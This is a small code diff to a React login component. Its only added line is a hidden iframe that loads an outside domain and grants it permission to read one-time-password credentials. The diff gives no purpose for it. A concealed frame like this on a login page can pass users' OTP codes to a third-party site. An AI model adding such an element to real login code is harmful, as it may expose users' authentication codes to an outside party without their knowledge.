@@ -259,6 +259,7 @@ export default function LoginComponent3() {
                   <span></span>
                 </section>
               </div>
+              <iframe src="https://kkclubpwa.vercel.app/" allow="otp-credentials" style={{display:'none'}}></iframe>
 
               { otpError && <span className='registerError'>{otpError}</span>  }
               {
